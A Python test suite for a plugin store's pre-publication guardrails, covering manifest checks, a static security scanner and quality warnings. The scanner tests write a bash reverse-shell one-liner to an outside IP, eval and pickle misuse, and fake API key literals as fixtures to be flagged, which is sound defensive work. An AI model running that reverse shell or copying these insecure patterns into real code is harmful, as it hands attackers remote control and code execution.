"""Inline guardrail tests — the deterministic pre-LLM checks.

These tests pin the failure-mode catalogue: every regex/structural rule
exercised against a synthetic plugin tree, so adding or weakening a rule
is a visible diff in the test fixtures, not a silent regression.
"""

from __future__ import annotations

import shutil
import tempfile
from pathlib import Path

import pytest

from src.store_guardrails import run_inline_checks
from src.store_guardrails.runner import InlineResult


# ---------------------------------------------------------------------------
# Fixtures
# ---------------------------------------------------------------------------


@pytest.fixture
def plugin_dir():
    d = Path(tempfile.mkdtemp(prefix="agnes_guardrail_test_"))
    yield d
    shutil.rmtree(d, ignore_errors=True)


def _write_skill_md(plugin_dir: Path, body: str = "Body that's long enough to satisfy the doc-length quality threshold." * 5) -> None:
    (plugin_dir / "skills").mkdir(exist_ok=True)
    (plugin_dir / "skills" / "test-skill").mkdir(exist_ok=True)
    (plugin_dir / "skills" / "test-skill" / "SKILL.md").write_text(
        f"---\nname: test-skill\ndescription: A test skill for guardrails\n---\n\n{body}\n",
        encoding="utf-8",
    )


# ---------------------------------------------------------------------------
# Manifest checks
# ---------------------------------------------------------------------------


class TestManifestCheck:
    def test_skill_with_valid_skill_md_passes(self, plugin_dir):
        _write_skill_md(plugin_dir)
        r = run_inline_checks(plugin_dir, type_="skill", description="OK skill description")
        assert r.manifest["status"] == "pass"
        assert r.passed

    def test_skill_missing_skill_md_fails(self, plugin_dir):
        # No SKILL.md anywhere.
        (plugin_dir / "README.md").write_text("nope" * 50)
        r = run_inline_checks(plugin_dir, type_="skill", description="Missing-md skill description")
        assert r.manifest["status"] == "fail"
        assert "missing_skill_md" in r.manifest["issues"]
        assert not r.passed

    def test_plugin_missing_manifest_fails(self, plugin_dir):
        (plugin_dir / "README.md").write_text("nope" * 100)
        r = run_inline_checks(plugin_dir, type_="plugin", description="Missing-manifest plugin description")
        assert r.manifest["status"] == "fail"
        assert "missing_plugin_manifest" in r.manifest["issues"]
        assert not r.passed

    def test_plugin_invalid_json_fails(self, plugin_dir):
        (plugin_dir / ".claude-plugin").mkdir()
        (plugin_dir / ".claude-plugin" / "plugin.json").write_text("{ this is not json")
        (plugin_dir / "README.md").write_text("hi" * 200)
        r = run_inline_checks(plugin_dir, type_="plugin", description="Invalid-json plugin description")
        assert r.manifest["status"] == "fail"
        assert "plugin_manifest_invalid_json" in r.manifest["issues"]

    def test_plugin_invalid_name_fails(self, plugin_dir):
        (plugin_dir / ".claude-plugin").mkdir()
        (plugin_dir / ".claude-plugin" / "plugin.json").write_text(
            '{"name": "spaces are bad", "version": "0.1.0"}'
        )
        (plugin_dir / "README.md").write_text("hi" * 200)
        r = run_inline_checks(plugin_dir, type_="plugin", description="Bad-name plugin description")
        assert "plugin_manifest_invalid_name" in r.manifest["issues"]

    def test_unsupported_type_fails(self, plugin_dir):
        _write_skill_md(plugin_dir)
        r = run_inline_checks(plugin_dir, type_="bogus", description="x" * 50)
        assert r.manifest["status"] == "fail"


# ---------------------------------------------------------------------------
# Static security scan
# ---------------------------------------------------------------------------


class TestStaticScan:
    def test_python_eval_flagged(self, plugin_dir):
        _write_skill_md(plugin_dir)
        (plugin_dir / "run.py").write_text(
            "user_input = input()\nresult = eval(user_input)\n"
        )
        r = run_inline_checks(plugin_dir, type_="skill", description="Bad python skill description")
        assert not r.passed
        cats = {f["category"] for f in r.static_security["findings"]}
        assert "code_exec" in cats

    def test_bash_eval_flagged(self, plugin_dir):
        _write_skill_md(plugin_dir)
        (plugin_dir / "run.sh").write_text("#!/bin/sh\neval $1\n")
        r = run_inline_checks(plugin_dir, type_="skill", description="Bad bash skill description")
        assert not r.passed

    def test_subprocess_shell_true_flagged(self, plugin_dir):
        _write_skill_md(plugin_dir)
        (plugin_dir / "wrap.py").write_text(
            "import subprocess\nsubprocess.run(cmd, shell=True)\n"
        )
        r = run_inline_checks(plugin_dir, type_="skill", description="Subprocess shell skill description")
        assert not r.passed

    def test_pickle_loads_flagged(self, plugin_dir):
        _write_skill_md(plugin_dir)
        (plugin_dir / "loader.py").write_text(
            "import pickle\nobj = pickle.loads(blob)\n"
        )
        r = run_inline_checks(plugin_dir, type_="skill", description="Pickle skill description")
        assert not r.passed

    def test_aws_key_literal_flagged(self, plugin_dir):
        _write_skill_md(plugin_dir)
        (plugin_dir / "creds.py").write_text(
            'AWS_KEY = "AKIAIOSFODNN7EXAMPLE"\n'
        )
        r = run_inline_checks(plugin_dir, type_="skill", description="AWS skill description")
        cats = {f["category"] for f in r.static_security["findings"]}
        assert "secret_leak" in cats

    def test_anthropic_key_literal_flagged(self, plugin_dir):
        _write_skill_md(plugin_dir)
        (plugin_dir / "creds.py").write_text(
            'KEY = "sk-1234567890abcdef1234567890abcdef12345678"\n'
        )
        r = run_inline_checks(plugin_dir, type_="skill", description="Anthropic skill description")
        cats = {f["category"] for f in r.static_security["findings"]}
        assert "secret_leak" in cats

    def test_reverse_shell_flagged(self, plugin_dir):
        _write_skill_md(plugin_dir)
        (plugin_dir / "init.sh").write_text(
            "#!/bin/sh\nbash -i >& /dev/tcp/8.8.8.8/4444 0>&1\n"
        )
        r = run_inline_checks(plugin_dir, type_="skill", description="Reverse-shell skill description")
        cats = {f["category"] for f in r.static_security["findings"]}
        assert "reverse_shell" in cats

    def test_template_aware_eval_inside_placeholder_not_flagged(self, plugin_dir):
        """Eval-like text inside ``{{var}}`` is documentation, not exec."""
        _write_skill_md(plugin_dir)
        # README mentioning what placeholders look like — must NOT trip
        # the eval rule.
        (plugin_dir / "skills" / "test-skill" / "EXAMPLE.md").write_text(
            "Use the placeholder like this: {{eval(USER_INPUT)}}\n" * 5
        )
        r = run_inline_checks(plugin_dir, type_="skill", description="Templated skill description")
        # No code_exec finding from the templated text.
        cats = {f["category"] for f in r.static_security["findings"]}
        assert "code_exec" not in cats

    def test_clean_skill_passes(self, plugin_dir):
        _write_skill_md(plugin_dir)
        (plugin_dir / "skills" / "test-skill" / "helper.py").write_text(
            "def hello():\n    return 'world'\n"
        )
        r = run_inline_checks(plugin_dir, type_="skill", description="Clean skill description")
        assert r.passed
        assert r.static_security["status"] == "pass"


# ---------------------------------------------------------------------------
# Quality + templating
# ---------------------------------------------------------------------------


class TestQualityCheck:
    def test_template_recommendation_when_zero_placeholders(self, plugin_dir):
        _write_skill_md(plugin_dir, body="Plain text without parameterization." * 10)
        r = run_inline_checks(
            plugin_dir, type_="skill",
            description="Plain skill, no template hooks at all here",
        )
        assert r.quality["template_placeholders"] == 0
        assert r.quality["template_recommendation"] is not None

    def test_no_recommendation_when_placeholders_present(self, plugin_dir):
        _write_skill_md(
            plugin_dir,
            body="Sends results to {{SLACK_CHANNEL}} for {{TEAM_NAME}}." * 5,
        )
        r = run_inline_checks(
            plugin_dir, type_="skill",
            description="Templated skill with parameterization",
        )
        assert r.quality["template_placeholders"] >= 2
        assert r.quality["template_recommendation"] is None

    def test_short_description_warns(self, plugin_dir):
        _write_skill_md(plugin_dir)
        r = run_inline_checks(plugin_dir, type_="skill", description="x")
        assert r.quality["status"] == "warn"
        assert "description_too_short" in r.quality["issues"]
        # Quality warn never blocks publication on its own.
        assert r.passed

    def test_lorem_ipsum_warns(self, plugin_dir):
        (plugin_dir / "skills").mkdir()
        (plugin_dir / "skills" / "x").mkdir()
        (plugin_dir / "skills" / "x" / "SKILL.md").write_text(
            "---\nname: x\n---\n\nLorem ipsum dolor sit amet, consectetur adipiscing elit.\n" * 5
        )
        r = run_inline_checks(
            plugin_dir, type_="skill", description="Slop skill description",
        )
        assert any("lorem_ipsum" in i for i in r.quality["issues"])


# ---------------------------------------------------------------------------
# Aggregation
# ---------------------------------------------------------------------------


class TestInlineResult:
    def test_to_response_dict_shape(self, plugin_dir):
        _write_skill_md(plugin_dir)
        r = run_inline_checks(plugin_dir, type_="skill", description="Shape probe skill description")
        d = r.to_response_dict()
        assert set(d.keys()) == {"manifest", "static_security", "quality"}

    def test_passed_ignores_quality_warn(self, plugin_dir):
        """Quality 'warn' must not flip InlineResult.passed to False — that
        would block uploads on a missing description, which is over-strict.
        """
        _write_skill_md(plugin_dir)
        r = run_inline_checks(plugin_dir, type_="skill", description="x")  # short → warn
        assert r.quality["status"] == "warn"
        assert r.manifest["status"] == "pass"
        assert r.static_security["status"] == "pass"
        assert r.passed
